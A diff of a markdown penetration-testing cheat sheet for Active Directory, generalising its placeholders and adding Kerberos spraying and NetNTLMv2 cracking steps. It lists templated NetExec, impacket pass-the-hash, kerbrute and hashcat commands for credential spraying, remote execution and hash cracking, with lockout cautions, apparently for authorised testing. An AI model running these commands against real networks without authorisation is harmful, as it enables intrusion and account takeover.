@@ -10,11 +10,9 @@ Use the account's actual authority. A successful login does not establish admini
 
 ```bash
 # Domain account
-nxc smb {{MS01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
-nxc smb {{MS02}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
+nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
 # Local account
-nxc smb {{MS01}} -u '{{USER}}' -p '{{PASS}}' --local-auth
-nxc smb {{MS02}} -u '{{USER}}' -p '{{PASS}}' --local-auth
+nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --local-auth
 ```
 
 [Domain authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain), [local authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local).
@@ -32,40 +30,59 @@ nxc smb {{MS02}} -u '{{USER}}' -p '{{PASS}}' --local-auth
 Requires administrative access and a working remote execution method. Verify the resulting identity.
 
 ```bash
-nxc smb {{MS01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
-nxc smb {{MS02}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
+nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
 ```
 
 NetExec's admin indicator is a lead; check the command result itself. [Source](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command).
 
 ## Kerberos authentication
 
-Set RHOST to the target's FQDN and DC01 to the KDC address.
+Set RHOST to the target's FQDN and DC to the KDC address.
 
 ```bash
-nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -k --kdcHost {{DC01}}
+nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -k --kdcHost {{DC}}
 ```
 
 Check [DNS and time](active-directory/kerberos#kerberos-dns-or-clock-failure) first. [Source](https://www.netexec.wiki/getting-started/using-kerberos).
 
 ## Password spraying
 
-Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali.
+Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali. Repeat per target box, emptying cracked pairs between rounds.
 
 ```bash
-nxc smb {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
-nxc winrm {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
+nxc smb {{RHOST}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
+nxc winrm {{RHOST}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
 ```
 
-`(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. Empty the cracked pair from the list before the next round to avoid lockouts. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).
+`(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).
 
 ## Pass-the-Hash
 
 Replay an NT hash where a password would otherwise go. Set NTHASH to the hash after the colon in `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.
 
 ```bash
-impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
-impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
+impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
+impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
 ```
 
-Requires administrator on the target; a domain-admin hash reaches {{DC01}} the same way. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
+Requires administrator on the target; a domain-admin hash reaches the controller directly. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
+
+## Kerberos password spraying
+
+Check the domain lockout policy first. Spray one candidate password against a reviewed users.txt; --safe aborts if Kerbrute observes a lockout. PASS is the single candidate, not necessarily a known valid password.
+
+```bash
+/home/kali/tools/kerbrute/kerbrute passwordspray --safe --dc '{{DC}}' -d '{{DOMAIN}}' users.txt '{{PASS}}'
+```
+
+Kerberos password sprays increment failed-login counts. Stop after a useful success and verify the account's authority. [Kerbrute password spraying](https://github.com/ropnop/kerbrute#password-spray).
+
+## Crack a captured NetNTLMv2 response
+
+Use this only for captured NetNTLMv2 material, such as a Responder SMB capture. It is not the format produced by Kerberoasting or AS-REP roasting.
+
+```bash
+hashcat -m 5600 ntlmv2.txt /home/kali/tools/wordlists/rockyou.txt
+```
+
+[Responder capture formats and cracking](https://github.com/lgandx/Responder), [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).
